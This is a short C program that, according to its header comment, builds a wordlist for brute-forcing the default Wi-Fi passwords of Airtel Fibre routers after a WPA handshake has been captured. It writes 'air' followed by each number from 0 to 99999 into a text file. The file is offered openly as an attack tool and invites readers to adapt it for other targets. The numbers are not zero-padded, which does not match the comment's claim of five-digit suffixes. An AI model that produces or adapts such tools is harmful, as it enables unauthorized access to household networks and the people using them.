

/***********************THIS PROGRAM GENERATES A WORDLIST TEXT FILE
                        WHICH YOU CAN USE TO CRACK AIRTEL FIBRE DEFAULT PASSWORDS
				        ON ANY ROUTER(AIRTEL) AFTER CAPTURING HANDSHAKE
						
						
						
						YOU CAN ALSO MODIFY THIS PROGRAM FOR SPECIFIC WORDLISTS AS NEEDED********/










#include<stdio.h> //header for file operations


int main(){


FILE* fp=fopen("Wordlist.txt" , "a+"); //creating wordlist file

char prefix[4]="air"; //default prefix for every default Airtel_fibre password

for(int i=0;i<=99999;i++){ // post five integer values


fprintf(fp,prefix);
fprintf(fp,"%d",i);
fprintf(fp,"\n");

}

fclose(fp);

}
